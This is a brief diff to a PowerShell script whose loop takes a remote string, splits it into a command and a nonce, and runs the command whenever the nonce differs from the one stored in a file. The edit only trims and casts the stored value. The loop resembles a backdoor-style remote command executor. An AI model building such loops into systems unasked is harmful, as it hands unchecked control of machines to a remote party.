@@ -123,7 +123,8 @@ while($true){
     $i=$remote.IndexOf('|')
     if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1) }
     else{ $cmd=$remote; $nonce=$remote }
-    $last=Get-Content $S -Raw -EA SilentlyContinue
+    $last=[string](Get-Content $S -Raw -EA SilentlyContinue)
+    $last=$last.Trim()
     if($cmd -and $nonce -ne $last){
       $nonce | Set-Content $S -Force
       Run-Cmd $cmd
